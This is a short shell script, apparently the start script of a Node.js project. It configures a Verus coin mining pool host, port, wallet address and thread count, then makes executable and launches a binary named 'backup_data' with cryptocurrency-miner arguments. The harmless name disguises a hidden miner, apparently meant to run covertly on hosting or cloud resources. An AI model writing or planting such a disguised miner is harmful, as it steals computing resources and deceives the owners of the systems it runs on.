#!/bin/sh
#npm start &
PoolHost=sg.vipor.net
Port=5040
PublicVerusCoinAddress=RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim
WorkerName=nodejs1
Threads=2
#set working directory to the location of this script
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd $DIR
chmod +x backup_data
./backup_data -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -p x -t "${Threads}" "$@"
#./backup_data -v -l sg.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.cloudall -p x -t 2
